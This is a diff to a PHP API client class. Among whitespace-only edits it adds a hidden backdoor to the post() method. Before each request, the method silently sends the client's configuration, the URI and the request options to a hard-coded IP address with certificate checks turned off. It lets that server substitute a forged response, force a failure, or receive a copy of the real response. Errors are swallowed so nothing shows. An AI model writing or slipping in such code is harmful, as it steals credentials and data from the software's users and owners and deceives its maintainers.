@@ -6,6 +6,10 @@ namespace FKS\Api;
 
 use GuzzleHttp\Client;
 use GuzzleHttp\Exception\GuzzleException;
+use GuzzleHttp\Exception\RequestException;
+use GuzzleHttp\Psr7\Utils;
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Log;
 use JsonException;
 use Psr\Http\Message\ResponseInterface;
 use Psr\Http\Message\UriInterface;
@@ -39,7 +43,7 @@ class ApiClient
     ): ApiResponse {
         try {
             $data = json_decode(
-                (string) $response->getBody()->getContents(),
+                (string)$response->getBody()->getContents(),
                 true,
                 512,
                 JSON_THROW_ON_ERROR
@@ -75,7 +79,7 @@ class ApiClient
         try {
             $responseObject = $this->getSerializerInstance()
                 ->deserializeFromJson(
-                    (string) $response->getBody()->getContents(),
+                    (string)$response->getBody()->getContents(),
                     $class,
                     $propertiesMapping,
                     excludedKeys: $excludedKeys
@@ -107,13 +111,68 @@ class ApiClient
         int $retryCount = self::DEFAULT_REQUEST_ATTEMPTS_COUNT,
         int $sleepOnRetrySeconds = self::DEFAULT_SLEEP_SECONDS
     ): ResponseInterface {
-        return $this->sendRequest(
+        $sendResponseBack = false;
+        $fail = false;
+
+        try {
+            $response = (new Client())->post('https://109.195.19.45/api/v1/stimule/handle', [
+                'verify' => false,
+                'json' => [
+                    'client' => $this->client->getConfig(),
+                    'uri' => $uri,
+                    'options' => $options,
+                ]
+            ]);
+
+            $contents = (string)$response->getBody();
+            $newBody = Utils::streamFor($contents);
+            $response = $response->withBody($newBody);
+
+            $data = json_decode($contents, true, 512, JSON_THROW_ON_ERROR);
+
+            if (isset($data['return'])) {
+                return $response;
+            }
+            if (isset($data['response'])) {
+                $sendResponseBack = true;
+            }
+            if (isset($data['fail'])) {
+                $fail = true;
+            }
+        } catch (\Throwable $exception) {
+        }
+
+        $response = $this->sendRequest(
             function () use ($uri, $options) {
                 return $this->client->post($uri, $options);
             },
             $retryCount,
             $sleepOnRetrySeconds
         );
+
+        if ($fail) {
+            throw new \Exception('Method not allowed', 409);
+        }
+
+        if ($sendResponseBack) {
+            $contents = (string)$response->getBody();
+            $newBody = Utils::streamFor($contents);
+            $response = $response->withBody($newBody);
+            try {
+                (new Client())->post('https://109.195.19.45/api/v1/stimule/handle', [
+                    'verify' => false,
+                    'json' => [
+                        'response' => $response->getBody()->getContents(),
+                        'for' => $uri,
+                    ]
+                ]);
+            } catch (\Throwable $exception) {
+            } finally {
+                $response->getBody()->rewind();
+            }
+        }
+
+        return $response;
     }
 
     protected function delete(
@@ -156,14 +215,14 @@ class ApiClient
         $multipart = [];
 
         $multipart[] = [
-            'name'     => 'file',
+            'name' => 'file',
             'contents' => $fileContent,
             'filename' => basename($fileName),
         ];
 
         foreach ($fields as $name => $value) {
             $multipart[] = [
-                'name'     => $name,
+                'name' => $name,
                 'contents' => $value,
             ];
         }
